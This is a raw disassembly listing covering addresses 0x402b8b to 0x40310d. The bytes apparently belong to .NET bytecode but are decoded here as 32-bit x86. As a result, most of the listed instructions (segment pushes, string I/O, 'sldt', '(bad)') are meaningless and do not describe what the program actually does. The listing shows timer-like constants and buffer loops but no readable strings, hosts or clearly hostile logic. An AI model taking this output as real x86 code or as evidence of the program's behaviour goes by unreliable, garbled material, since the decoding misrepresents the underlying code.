  402b8b:	14 20                	adc    $0x20,%al
  402b8d:	c0 00 00             	rolb   $0x0,(%eax)
  402b90:	00 16                	add    %dl,(%esi)
  402b92:	6f                   	outsl  %ds:(%esi),(%dx)
  402b93:	39 00                	cmp    %eax,(%eax)
  402b95:	00 0a                	add    %cl,(%edx)
  402b97:	1a 6a 28             	sbb    0x28(%edx),%ch
  402b9a:	0d 00 00 06 28       	or     $0x28060000,%eax
  402b9f:	0c 00                	or     $0x0,%al
  402ba1:	00 06                	add    %al,(%esi)
  402ba3:	d4 8d                	aam    $0x8d
  402ba5:	44                   	inc    %esp
  402ba6:	00 00                	add    %al,(%eax)
  402ba8:	01 28                	add    %ebp,(%eax)
  402baa:	0b 00                	or     (%eax),%eax
  402bac:	00 06                	add    %al,(%esi)
  402bae:	16                   	push   %ss
  402baf:	6a 28                	push   $0x28
  402bb1:	0f 00 00             	sldt   (%eax)
  402bb4:	06                   	push   %es
  402bb5:	28 2f                	sub    %ch,(%edi)
  402bb7:	00 00                	add    %al,(%eax)
  402bb9:	06                   	push   %es
  402bba:	28 20                	sub    %ah,(%eax)
  402bbc:	00 00                	add    %al,(%eax)
  402bbe:	06                   	push   %es
  402bbf:	16                   	push   %ss
  402bc0:	28 18                	sub    %bl,(%eax)
  402bc2:	00 00                	add    %al,(%eax)
  402bc4:	06                   	push   %es
  402bc5:	16                   	push   %ss
  402bc6:	28 1a                	sub    %bl,(%edx)
  402bc8:	00 00                	add    %al,(%eax)
  402bca:	06                   	push   %es
  402bcb:	14 fe                	adc    $0xfe,%al
  402bcd:	06                   	push   %es
  402bce:	21 00                	and    %eax,(%eax)
  402bd0:	00 06                	add    %al,(%esi)
  402bd2:	73 3a                	jae    0x402c0e
  402bd4:	00 00                	add    %al,(%eax)
  402bd6:	0a 14 73             	or     (%ebx,%esi,2),%dl
  402bd9:	27                   	daa
  402bda:	00 00                	add    %al,(%eax)
  402bdc:	0a 20                	or     (%eax),%ah
  402bde:	10 27                	adc    %ah,(%edi)
  402be0:	00 00                	add    %al,(%eax)
  402be2:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  402be8:	32 00                	xor    (%eax),%al
  402bea:	00 0a                	add    %cl,(%edx)
  402bec:	73 27                	jae    0x402c15
  402bee:	00 00                	add    %al,(%eax)
  402bf0:	0a 20                	or     (%eax),%ah
  402bf2:	10 27                	adc    %ah,(%edi)
  402bf4:	00 00                	add    %al,(%eax)
  402bf6:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  402bfc:	32 00                	xor    (%eax),%al
  402bfe:	00 0a                	add    %cl,(%edx)
  402c00:	73 3b                	jae    0x402c3d
  402c02:	00 00                	add    %al,(%eax)
  402c04:	0a 28                	or     (%eax),%ch
  402c06:	11 00                	adc    %eax,(%eax)
  402c08:	00 06                	add    %al,(%esi)
  402c0a:	14 fe                	adc    $0xfe,%al
  402c0c:	06                   	push   %es
  402c0d:	22 00                	and    (%eax),%al
  402c0f:	00 06                	add    %al,(%esi)
  402c11:	73 3a                	jae    0x402c4d
  402c13:	00 00                	add    %al,(%eax)
  402c15:	0a 14 17             	or     (%edi,%edx,1),%dl
  402c18:	17                   	pop    %ss
  402c19:	73 3b                	jae    0x402c56
  402c1b:	00 00                	add    %al,(%eax)
  402c1d:	0a 28                	or     (%eax),%ch
  402c1f:	16                   	push   %ss
  402c20:	00 00                	add    %al,(%eax)
  402c22:	06                   	push   %es
  402c23:	28 08                	sub    %cl,(%eax)
  402c25:	00 00                	add    %al,(%eax)
  402c27:	06                   	push   %es
  402c28:	28 0a                	sub    %cl,(%edx)
  402c2a:	00 00                	add    %al,(%eax)
  402c2c:	06                   	push   %es
  402c2d:	28 0e                	sub    %cl,(%esi)
  402c2f:	00 00                	add    %al,(%eax)
  402c31:	06                   	push   %es
  402c32:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402c38:	69 14 fe 06 1f 00 00 	imul   $0x1f06,(%esi,%edi,8),%edx
  402c3f:	06                   	push   %es
  402c40:	73 3c                	jae    0x402c7e
  402c42:	00 00                	add    %al,(%eax)
  402c44:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402c47:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402c4c:	38 06                	cmp    %al,(%esi)
  402c4e:	00 00                	add    %al,(%eax)
  402c50:	00 16                	add    %dl,(%esi)
  402c52:	28 13                	sub    %dl,(%ebx)
  402c54:	00 00                	add    %al,(%eax)
  402c56:	06                   	push   %es
  402c57:	dd 0c 00             	fisttpll (%eax,%eax,1)
  402c5a:	00 00                	add    %al,(%eax)
  402c5c:	26 16                	es push %ss
  402c5e:	28 13                	sub    %dl,(%ebx)
  402c60:	00 00                	add    %al,(%eax)
  402c62:	06                   	push   %es
  402c63:	dd 00                	fldl   (%eax)
  402c65:	00 00                	add    %al,(%eax)
  402c67:	00 2a                	add    %ch,(%edx)
  402c69:	00 00                	add    %al,(%eax)
  402c6b:	00 41 4c             	add    %al,0x4c(%ecx)
  402c6e:	00 00                	add    %al,(%eax)
  402c70:	00 00                	add    %al,(%eax)
  402c72:	00 00                	add    %al,(%eax)
  402c74:	ce                   	into
  402c75:	00 00                	add    %al,(%eax)
  402c77:	00 26                	add    %ah,(%esi)
  402c79:	00 00                	add    %al,(%eax)
  402c7b:	00 f4                	add    %dh,%ah
  402c7d:	00 00                	add    %al,(%eax)
  402c7f:	00 06                	add    %al,(%esi)
  402c81:	00 00                	add    %al,(%eax)
  402c83:	00 01                	add    %al,(%ecx)
  402c85:	00 00                	add    %al,(%eax)
  402c87:	01 02                	add    %eax,(%edx)
  402c89:	00 00                	add    %al,(%eax)
  402c8b:	00 21                	add    %ah,(%ecx)
  402c8d:	01 00                	add    %eax,(%eax)
  402c8f:	00 82 00 00 00 a3    	add    %al,-0x5d000000(%edx)
  402c95:	01 00                	add    %eax,(%eax)
  402c97:	00 0f                	add    %cl,(%edi)
	...
  402ca5:	00 00                	add    %al,(%eax)
  402ca7:	00 e4                	add    %ah,%ah
  402ca9:	02 00                	add    (%eax),%al
  402cab:	00 e4                	add    %ah,%ah
  402cad:	02 00                	add    (%eax),%al
  402caf:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402cb2:	00 00                	add    %al,(%eax)
  402cb4:	01 00                	add    %eax,(%eax)
  402cb6:	00 01                	add    %al,(%ecx)
  402cb8:	1b 30                	sbb    (%eax),%esi
  402cba:	02 00                	add    (%eax),%al
  402cbc:	6a 00                	push   $0x0
  402cbe:	00 00                	add    %al,(%eax)
  402cc0:	00 00                	add    %al,(%eax)
  402cc2:	00 00                	add    %al,(%eax)
  402cc4:	28 08                	sub    %cl,(%eax)
  402cc6:	00 00                	add    %al,(%eax)
  402cc8:	06                   	push   %es
  402cc9:	25 3a 06 00 00       	and    $0x63a,%eax
  402cce:	00 26                	add    %ah,(%esi)
  402cd0:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402cd6:	40                   	inc    %eax
  402cd7:	00 00                	add    %al,(%eax)
  402cd9:	0a 28                	or     (%eax),%ch
  402cdb:	06                   	push   %es
  402cdc:	00 00                	add    %al,(%eax)
  402cde:	06                   	push   %es
  402cdf:	25 3a 06 00 00       	and    $0x63a,%eax
  402ce4:	00 26                	add    %ah,(%esi)
  402ce6:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402cec:	41                   	inc    %ecx
  402ced:	00 00                	add    %al,(%eax)
  402cef:	0a 28                	or     (%eax),%ch
  402cf1:	15 00 00 06 25       	adc    $0x25060000,%eax
  402cf6:	3a 06                	cmp    (%esi),%al
  402cf8:	00 00                	add    %al,(%eax)
  402cfa:	00 26                	add    %ah,(%esi)
  402cfc:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402d02:	42                   	inc    %edx
  402d03:	00 00                	add    %al,(%eax)
  402d05:	0a 28                	or     (%eax),%ch
  402d07:	10 00                	adc    %al,(%eax)
  402d09:	00 06                	add    %al,(%esi)
  402d0b:	25 3a 06 00 00       	and    $0x63a,%eax
  402d10:	00 26                	add    %ah,(%esi)
  402d12:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402d18:	42                   	inc    %edx
  402d19:	00 00                	add    %al,(%eax)
  402d1b:	0a dd                	or     %ch,%bl
  402d1d:	06                   	push   %es
  402d1e:	00 00                	add    %al,(%eax)
  402d20:	00 26                	add    %ah,(%esi)
  402d22:	dd 00                	fldl   (%eax)
  402d24:	00 00                	add    %al,(%eax)
  402d26:	00 16                	add    %dl,(%esi)
  402d28:	28 13                	sub    %dl,(%ebx)
  402d2a:	00 00                	add    %al,(%eax)
  402d2c:	06                   	push   %es
  402d2d:	2a 00                	sub    (%eax),%al
  402d2f:	00 01                	add    %al,(%ecx)
  402d31:	10 00                	adc    %al,(%eax)
  402d33:	00 00                	add    %al,(%eax)
  402d35:	00 00                	add    %al,(%eax)
  402d37:	00 5d 5d             	add    %bl,0x5d(%ebp)
  402d3a:	00 06                	add    %al,(%esi)
  402d3c:	01 00                	add    %eax,(%eax)
  402d3e:	00 01                	add    %al,(%ecx)
  402d40:	1b 30                	sbb    (%eax),%esi
  402d42:	06                   	push   %es
  402d43:	00 ba 01 00 00 04    	add    %bh,0x4000001(%edx)
  402d49:	00 00                	add    %al,(%eax)
  402d4b:	11 28                	adc    %ebp,(%eax)
  402d4d:	06                   	push   %es
  402d4e:	00 00                	add    %al,(%eax)
  402d50:	06                   	push   %es
  402d51:	6f                   	outsl  %ds:(%esi),(%dx)
  402d52:	2b 00                	sub    (%eax),%eax
  402d54:	00 0a                	add    %cl,(%edx)
  402d56:	39 0a                	cmp    %ecx,(%edx)
  402d58:	00 00                	add    %al,(%eax)
  402d5a:	00 28                	add    %ch,(%eax)
  402d5c:	12 00                	adc    (%eax),%al
  402d5e:	00 06                	add    %al,(%esi)
  402d60:	3a 0b                	cmp    (%ebx),%cl
  402d62:	00 00                	add    %al,(%eax)
  402d64:	00 16                	add    %dl,(%esi)
  402d66:	28 13                	sub    %dl,(%ebx)
  402d68:	00 00                	add    %al,(%eax)
  402d6a:	06                   	push   %es
  402d6b:	dd 95 01 00 00 28    	fstl   0x28000001(%ebp)
  402d71:	08 00                	or     %al,(%eax)
  402d73:	00 06                	add    %al,(%esi)
  402d75:	02 6f 43             	add    0x43(%edi),%ch
  402d78:	00 00                	add    %al,(%eax)
  402d7a:	0a 0a                	or     (%edx),%cl
  402d7c:	06                   	push   %es
  402d7d:	16                   	push   %ss
  402d7e:	3e 6b 01 00          	imul   $0x0,%ds:(%ecx),%eax
  402d82:	00 28                	add    %ch,(%eax)
  402d84:	0e                   	push   %cs
  402d85:	00 00                	add    %al,(%eax)
  402d87:	06                   	push   %es
  402d88:	06                   	push   %es
  402d89:	6a 58                	push   $0x58
  402d8b:	28 0f                	sub    %cl,(%edi)
  402d8d:	00 00                	add    %al,(%eax)
  402d8f:	06                   	push   %es
  402d90:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402d93:	00 06                	add    %al,(%esi)
  402d95:	06                   	push   %es
  402d96:	6a 59                	push   $0x59
  402d98:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  402d9e:	0c 00                	or     $0x0,%al
  402da0:	00 06                	add    %al,(%esi)
  402da2:	3a 02                	cmp    (%edx),%al
  402da4:	01 00                	add    %eax,(%eax)
  402da6:	00 28                	add    %ch,(%eax)
  402da8:	0a 00                	or     (%eax),%al
  402daa:	00 06                	add    %al,(%esi)
  402dac:	16                   	push   %ss
  402dad:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  402db1:	0a 6a 28             	or     0x28(%edx),%ch
  402db4:	0d 00 00 06 28       	or     $0x28060000,%eax
  402db9:	0c 00                	or     $0x0,%al
  402dbb:	00 06                	add    %al,(%esi)
  402dbd:	16                   	push   %ss
  402dbe:	6a 3e                	push   $0x3e
  402dc0:	c2 00 00             	ret    $0x0
  402dc3:	00 16                	add    %dl,(%esi)
  402dc5:	6a 28                	push   $0x28
  402dc7:	0f 00 00             	sldt   (%eax)
  402dca:	06                   	push   %es
  402dcb:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402dce:	00 06                	add    %al,(%esi)
  402dd0:	d4 8d                	aam    $0x8d
  402dd2:	44                   	inc    %esp
  402dd3:	00 00                	add    %al,(%eax)
  402dd5:	01 28                	add    %ebp,(%eax)
  402dd7:	0b 00                	or     (%eax),%eax
  402dd9:	00 06                	add    %al,(%esi)
  402ddb:	38 5f 00             	cmp    %bl,0x0(%edi)
  402dde:	00 00                	add    %al,(%eax)
  402de0:	28 08                	sub    %cl,(%eax)
  402de2:	00 00                	add    %al,(%eax)
  402de4:	06                   	push   %es
  402de5:	28 0a                	sub    %cl,(%edx)
  402de7:	00 00                	add    %al,(%eax)
  402de9:	06                   	push   %es
  402dea:	28 0e                	sub    %cl,(%esi)
  402dec:	00 00                	add    %al,(%eax)
  402dee:	06                   	push   %es
  402def:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402df5:	69 6f 45 00 00 0a 0b 	imul   $0xb0a0000,0x45(%edi),%ebp
  402dfc:	07                   	pop    %es
  402dfd:	16                   	push   %ss
  402dfe:	3d 0b 00 00 00       	cmp    $0xb,%eax
  402e03:	16                   	push   %ss
  402e04:	28 13                	sub    %dl,(%ebx)
  402e06:	00 00                	add    %al,(%eax)
  402e08:	06                   	push   %es
  402e09:	dd f7                	(bad)
  402e0b:	00 00                	add    %al,(%eax)
  402e0d:	00 28                	add    %ch,(%eax)
  402e0f:	0e                   	push   %cs
  402e10:	00 00                	add    %al,(%eax)
  402e12:	06                   	push   %es
  402e13:	07                   	pop    %es
  402e14:	6a 58                	push   $0x58
  402e16:	28 0f                	sub    %cl,(%edi)
  402e18:	00 00                	add    %al,(%eax)
  402e1a:	06                   	push   %es
  402e1b:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402e1e:	00 06                	add    %al,(%esi)
  402e20:	07                   	pop    %es
  402e21:	6a 59                	push   $0x59
  402e23:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  402e29:	0c 00                	or     $0x0,%al
  402e2b:	00 06                	add    %al,(%esi)
  402e2d:	16                   	push   %ss
  402e2e:	6a 3c                	push   $0x3c
  402e30:	0b 00                	or     (%eax),%eax
  402e32:	00 00                	add    %al,(%eax)
  402e34:	16                   	push   %ss
  402e35:	28 13                	sub    %dl,(%ebx)
  402e37:	00 00                	add    %al,(%eax)
  402e39:	06                   	push   %es
  402e3a:	dd c6                	ffree  %st(6)
  402e3c:	00 00                	add    %al,(%eax)
  402e3e:	00 28                	add    %ch,(%eax)
  402e40:	0c 00                	or     $0x0,%al
  402e42:	00 06                	add    %al,(%esi)
  402e44:	16                   	push   %ss
  402e45:	6a 30                	push   $0x30
  402e47:	98                   	cwtl
  402e48:	14 fe                	adc    $0xfe,%al
  402e4a:	06                   	push   %es
  402e4b:	46                   	inc    %esi
  402e4c:	00 00                	add    %al,(%eax)
  402e4e:	06                   	push   %es
  402e4f:	73 46                	jae    0x402e97
  402e51:	00 00                	add    %al,(%eax)
  402e53:	0a 73 47             	or     0x47(%ebx),%dh
  402e56:	00 00                	add    %al,(%eax)
  402e58:	0a 28                	or     (%eax),%ch
  402e5a:	0a 00                	or     (%eax),%al
  402e5c:	00 06                	add    %al,(%esi)
  402e5e:	6f                   	outsl  %ds:(%esi),(%dx)
  402e5f:	48                   	dec    %eax
  402e60:	00 00                	add    %al,(%eax)
  402e62:	0a 16                	or     (%esi),%dl
  402e64:	6a 28                	push   $0x28
  402e66:	0f 00 00             	sldt   (%eax)
  402e69:	06                   	push   %es
  402e6a:	1a 6a 28             	sbb    0x28(%edx),%ch
  402e6d:	0d 00 00 06 28       	or     $0x28060000,%eax
  402e72:	0c 00                	or     $0x0,%al
  402e74:	00 06                	add    %al,(%esi)
  402e76:	d4 8d                	aam    $0x8d
  402e78:	44                   	inc    %esp
  402e79:	00 00                	add    %al,(%eax)
  402e7b:	01 28                	add    %ebp,(%eax)
  402e7d:	0b 00                	or     (%eax),%eax
  402e7f:	00 06                	add    %al,(%esi)
  402e81:	38 3a                	cmp    %bh,(%edx)
  402e83:	00 00                	add    %al,(%eax)
  402e85:	00 1a                	add    %bl,(%edx)
  402e87:	6a 28                	push   $0x28
  402e89:	0d 00 00 06 28       	or     $0x28060000,%eax
  402e8e:	0c 00                	or     $0x0,%al
  402e90:	00 06                	add    %al,(%esi)
  402e92:	d4 8d                	aam    $0x8d
  402e94:	44                   	inc    %esp
  402e95:	00 00                	add    %al,(%eax)
  402e97:	01 28                	add    %ebp,(%eax)
  402e99:	0b 00                	or     (%eax),%eax
  402e9b:	00 06                	add    %al,(%esi)
  402e9d:	16                   	push   %ss
  402e9e:	6a 28                	push   $0x28
  402ea0:	0f 00 00             	sldt   (%eax)
  402ea3:	06                   	push   %es
  402ea4:	38 17                	cmp    %dl,(%edi)
  402ea6:	00 00                	add    %al,(%eax)
  402ea8:	00 28                	add    %ch,(%eax)
  402eaa:	0c 00                	or     $0x0,%al
  402eac:	00 06                	add    %al,(%esi)
  402eae:	16                   	push   %ss
  402eaf:	6a 3c                	push   $0x3c
  402eb1:	0b 00                	or     (%eax),%eax
  402eb3:	00 00                	add    %al,(%eax)
  402eb5:	16                   	push   %ss
  402eb6:	28 13                	sub    %dl,(%ebx)
  402eb8:	00 00                	add    %al,(%eax)
  402eba:	06                   	push   %es
  402ebb:	dd 45 00             	fldl   0x0(%ebp)
  402ebe:	00 00                	add    %al,(%eax)
  402ec0:	28 08                	sub    %cl,(%eax)
  402ec2:	00 00                	add    %al,(%eax)
  402ec4:	06                   	push   %es
  402ec5:	28 0a                	sub    %cl,(%edx)
  402ec7:	00 00                	add    %al,(%eax)
  402ec9:	06                   	push   %es
  402eca:	28 0e                	sub    %cl,(%esi)
  402ecc:	00 00                	add    %al,(%eax)
  402ece:	06                   	push   %es
  402ecf:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402ed5:	69 14 fe 06 1f 00 00 	imul   $0x1f06,(%esi,%edi,8),%edx
  402edc:	06                   	push   %es
  402edd:	73 3c                	jae    0x402f1b
  402edf:	00 00                	add    %al,(%eax)
  402ee1:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402ee4:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402ee9:	38 06                	cmp    %al,(%esi)
  402eeb:	00 00                	add    %al,(%eax)
  402eed:	00 16                	add    %dl,(%esi)
  402eef:	28 13                	sub    %dl,(%ebx)
  402ef1:	00 00                	add    %al,(%eax)
  402ef3:	06                   	push   %es
  402ef4:	dd 0c 00             	fisttpll (%eax,%eax,1)
  402ef7:	00 00                	add    %al,(%eax)
  402ef9:	26 16                	es push %ss
  402efb:	28 13                	sub    %dl,(%ebx)
  402efd:	00 00                	add    %al,(%eax)
  402eff:	06                   	push   %es
  402f00:	dd 00                	fldl   (%eax)
  402f02:	00 00                	add    %al,(%eax)
  402f04:	00 2a                	add    %ch,(%edx)
  402f06:	00 00                	add    %al,(%eax)
  402f08:	41                   	inc    %ecx
  402f09:	1c 00                	sbb    $0x0,%al
	...
  402f13:	00 ad 01 00 00 ad    	add    %ch,-0x52ffffff(%ebp)
  402f19:	01 00                	add    %eax,(%eax)
  402f1b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402f1e:	00 00                	add    %al,(%eax)
  402f20:	01 00                	add    %eax,(%eax)
  402f22:	00 01                	add    %al,(%ecx)
  402f24:	1b 30                	sbb    (%eax),%esi
  402f26:	04 00                	add    $0x0,%al
  402f28:	04 01                	add    $0x1,%al
  402f2a:	00 00                	add    %al,(%eax)
  402f2c:	05 00 00 11 28       	add    $0x28110000,%eax
  402f31:	14 00                	adc    $0x0,%al
  402f33:	00 06                	add    %al,(%esi)
  402f35:	0a 16                	or     (%esi),%dl
  402f37:	0b 06                	or     (%esi),%eax
  402f39:	12 01                	adc    (%ecx),%al
  402f3b:	28 49 00             	sub    %cl,0x0(%ecx)
  402f3e:	00 0a                	add    %cl,(%edx)
  402f40:	28 12                	sub    %dl,(%edx)
  402f42:	00 00                	add    %al,(%eax)
  402f44:	06                   	push   %es
  402f45:	3a 05 00 00 00 dd    	cmp    0xdd000000,%al
  402f4b:	e4 00                	in     $0x0,%al
  402f4d:	00 00                	add    %al,(%eax)
  402f4f:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  402f55:	00 0a                	add    %cl,(%edx)
  402f57:	0c 28                	or     $0x28,%al
  402f59:	06                   	push   %es
  402f5a:	00 00                	add    %al,(%eax)
  402f5c:	06                   	push   %es
  402f5d:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402f62:	00 0a                	add    %cl,(%edx)
  402f64:	26 28 08             	sub    %cl,%es:(%eax)
  402f67:	00 00                	add    %al,(%eax)
  402f69:	06                   	push   %es
  402f6a:	08 16                	or     %dl,(%esi)
  402f6c:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  402f72:	00 0a                	add    %cl,(%edx)
  402f74:	02 8e 69 20 40 42    	add    0x42402069(%esi),%cl
  402f7a:	0f 00                	(bad)
  402f7c:	3e 6e                	outsb  %ds:(%esi),(%dx)
  402f7e:	00 00                	add    %al,(%eax)
  402f80:	00 02                	add    %al,(%edx)
  402f82:	73 4d                	jae    0x402fd1
  402f84:	00 00                	add    %al,(%eax)
  402f86:	0a 0d 16 13 04 09    	or     0x9041316,%cl
  402f8c:	16                   	push   %ss
  402f8d:	6a 6f                	push   $0x6f
  402f8f:	4e                   	dec    %esi
  402f90:	00 00                	add    %al,(%eax)
  402f92:	0a 20                	or     (%eax),%ah
  402f94:	50                   	push   %eax
  402f95:	c3                   	ret
  402f96:	00 00                	add    %al,(%eax)
  402f98:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  402f9c:	01 13                	add    %edx,(%ebx)
  402f9e:	05 38 26 00 00       	add    $0x2638,%eax
  402fa3:	00 28                	add    %ch,(%eax)
  402fa5:	06                   	push   %es
  402fa6:	00 00                	add    %al,(%eax)
  402fa8:	06                   	push   %es
  402fa9:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402fae:	00 0a                	add    %cl,(%edx)
  402fb0:	26 28 08             	sub    %cl,%es:(%eax)
  402fb3:	00 00                	add    %al,(%eax)
  402fb5:	06                   	push   %es
  402fb6:	11 05 16 11 04 6f    	adc    %eax,0x6f041116
  402fbc:	4c                   	dec    %esp
  402fbd:	00 00                	add    %al,(%eax)
  402fbf:	0a 28                	or     (%eax),%ch
  402fc1:	08 00                	or     %al,(%eax)
  402fc3:	00 06                	add    %al,(%esi)
  402fc5:	6f                   	outsl  %ds:(%esi),(%dx)
  402fc6:	4f                   	dec    %edi
  402fc7:	00 00                	add    %al,(%eax)
  402fc9:	0a 09                	or     (%ecx),%cl
  402fcb:	11 05 16 11 05 8e    	adc    %eax,0x8e051116
  402fd1:	69 6f 45 00 00 0a 25 	imul   $0x250a0000,0x45(%edi),%ebp
  402fd8:	13 04 16             	adc    (%esi,%edx,1),%eax
  402fdb:	30 c7                	xor    %al,%bh
  402fdd:	dd 33                	fnsave (%ebx)
  402fdf:	00 00                	add    %al,(%eax)
  402fe1:	00 09                	add    %cl,(%ecx)
  402fe3:	39 06                	cmp    %eax,(%esi)
  402fe5:	00 00                	add    %al,(%eax)
  402fe7:	00 09                	add    %cl,(%ecx)
  402fe9:	6f                   	outsl  %ds:(%esi),(%dx)
  402fea:	33 00                	xor    (%eax),%eax
  402fec:	00 0a                	add    %cl,(%edx)
  402fee:	dc 28                	fsubrl (%eax)
  402ff0:	06                   	push   %es
  402ff1:	00 00                	add    %al,(%eax)
  402ff3:	06                   	push   %es
  402ff4:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402ff9:	00 0a                	add    %cl,(%edx)
  402ffb:	26 28 08             	sub    %cl,%es:(%eax)
  402ffe:	00 00                	add    %al,(%eax)
  403000:	06                   	push   %es
  403001:	02 16                	add    (%esi),%dl
  403003:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  403009:	00 0a                	add    %cl,(%edx)
  40300b:	28 08                	sub    %cl,(%eax)
  40300d:	00 00                	add    %al,(%eax)
  40300f:	06                   	push   %es
  403010:	6f                   	outsl  %ds:(%esi),(%dx)
  403011:	4f                   	dec    %edi
  403012:	00 00                	add    %al,(%eax)
  403014:	0a dd                	or     %ch,%bl
  403016:	19 00                	sbb    %eax,(%eax)
  403018:	00 00                	add    %al,(%eax)
  40301a:	26 16                	es push %ss
  40301c:	28 13                	sub    %dl,(%ebx)
  40301e:	00 00                	add    %al,(%eax)
  403020:	06                   	push   %es
  403021:	dd 0d 00 00 00 07    	fisttpll 0x7000000
  403027:	39 06                	cmp    %eax,(%esi)
  403029:	00 00                	add    %al,(%eax)
  40302b:	00 06                	add    %al,(%esi)
  40302d:	28 50 00             	sub    %dl,0x0(%eax)
  403030:	00 0a                	add    %cl,(%edx)
  403032:	dc 2a                	fsubrl (%edx)
  403034:	01 28                	add    %ebp,(%eax)
  403036:	00 00                	add    %al,(%eax)
  403038:	02 00                	add    (%eax),%al
  40303a:	58                   	pop    %eax
  40303b:	00 5a b2             	add    %bl,-0x4e(%edx)
  40303e:	00 0d 00 00 00 00    	add    %cl,0x0
  403044:	00 00                	add    %al,(%eax)
  403046:	10 00                	adc    %al,(%eax)
  403048:	da ea                	(bad)
  40304a:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40304d:	00 00                	add    %al,(%eax)
  40304f:	01 02                	add    %eax,(%edx)
  403051:	00 08                	add    %cl,(%eax)
  403053:	00 ee                	add    %ch,%dh
  403055:	f6 00 0d             	testb  $0xd,(%eax)
  403058:	00 00                	add    %al,(%eax)
  40305a:	00 00                	add    %al,(%eax)
  40305c:	1b 30                	sbb    (%eax),%esi
  40305e:	03 00                	add    (%eax),%eax
  403060:	50                   	push   %eax
  403061:	00 00                	add    %al,(%eax)
  403063:	00 00                	add    %al,(%eax)
  403065:	00 00                	add    %al,(%eax)
  403067:	00 73 94             	add    %dh,-0x6c(%ebx)
  40306a:	00 00                	add    %al,(%eax)
  40306c:	06                   	push   %es
  40306d:	25 72 5e 21 00       	and    $0x215e72,%eax
  403072:	70 6f                	jo     0x4030e3
  403074:	7f 00                	jg     0x403076
  403076:	00 06                	add    %al,(%esi)
  403078:	72 6c                	jb     0x4030e6
  40307a:	21 00                	and    %eax,(%eax)
  40307c:	70 6f                	jo     0x4030ed
  40307e:	8c 00                	mov    %es,(%eax)
  403080:	00 06                	add    %al,(%esi)
  403082:	25 72 76 21 00       	and    $0x217672,%eax
  403087:	70 6f                	jo     0x4030f8
  403089:	7f 00                	jg     0x40308b
  40308b:	00 06                	add    %al,(%esi)
  40308d:	28 35 00 00 06 6f    	sub    %dh,0x6f060000
  403093:	8c 00                	mov    %es,(%eax)
  403095:	00 06                	add    %al,(%esi)
  403097:	6f                   	outsl  %ds:(%esi),(%dx)
  403098:	89 00                	mov    %eax,(%eax)
  40309a:	00 06                	add    %al,(%esi)
  40309c:	28 20                	sub    %ah,(%eax)
  40309e:	00 00                	add    %al,(%eax)
  4030a0:	06                   	push   %es
  4030a1:	28 51 00             	sub    %dl,0x0(%ecx)
  4030a4:	00 0a                	add    %cl,(%edx)
  4030a6:	17                   	pop    %ss
  4030a7:	28 1a                	sub    %bl,(%edx)
  4030a9:	00 00                	add    %al,(%eax)
  4030ab:	06                   	push   %es
  4030ac:	dd 06                	fldl   (%esi)
  4030ae:	00 00                	add    %al,(%eax)
  4030b0:	00 26                	add    %ah,(%esi)
  4030b2:	dd 00                	fldl   (%eax)
  4030b4:	00 00                	add    %al,(%eax)
  4030b6:	00 2a                	add    %ch,(%edx)
  4030b8:	01 10                	add    %edx,(%eax)
  4030ba:	00 00                	add    %al,(%eax)
  4030bc:	00 00                	add    %al,(%eax)
  4030be:	00 00                	add    %al,(%eax)
  4030c0:	49                   	dec    %ecx
  4030c1:	49                   	dec    %ecx
  4030c2:	00 06                	add    %al,(%esi)
  4030c4:	01 00                	add    %eax,(%eax)
  4030c6:	00 01                	add    %al,(%ecx)
  4030c8:	1b 30                	sbb    (%eax),%esi
  4030ca:	02 00                	add    (%eax),%al
  4030cc:	2c 00                	sub    $0x0,%al
  4030ce:	00 00                	add    %al,(%eax)
  4030d0:	00 00                	add    %al,(%eax)
  4030d2:	00 00                	add    %al,(%eax)
  4030d4:	28 19                	sub    %bl,(%ecx)
  4030d6:	00 00                	add    %al,(%eax)
  4030d8:	06                   	push   %es
  4030d9:	39 16                	cmp    %edx,(%esi)
  4030db:	00 00                	add    %al,(%eax)
  4030dd:	00 28                	add    %ch,(%eax)
  4030df:	12 00                	adc    (%eax),%al
  4030e1:	00 06                	add    %al,(%esi)
  4030e3:	39 0c 00             	cmp    %ecx,(%eax,%eax,1)
  4030e6:	00 00                	add    %al,(%eax)
  4030e8:	28 17                	sub    %dl,(%edi)
  4030ea:	00 00                	add    %al,(%eax)
  4030ec:	06                   	push   %es
  4030ed:	17                   	pop    %ss
  4030ee:	58                   	pop    %eax
  4030ef:	28 18                	sub    %bl,(%eax)
  4030f1:	00 00                	add    %al,(%eax)
  4030f3:	06                   	push   %es
  4030f4:	dd 06                	fldl   (%esi)
  4030f6:	00 00                	add    %al,(%eax)
  4030f8:	00 26                	add    %ah,(%esi)
  4030fa:	dd 00                	fldl   (%eax)
  4030fc:	00 00                	add    %al,(%eax)
  4030fe:	00 2a                	add    %ch,(%edx)
  403100:	01 10                	add    %edx,(%eax)
  403102:	00 00                	add    %al,(%eax)
  403104:	00 00                	add    %al,(%eax)
  403106:	00 00                	add    %al,(%eax)
  403108:	25 25 00 06 01       	and    $0x1060025,%eax
  40310d:	00 00                	add    %al,(%eax)
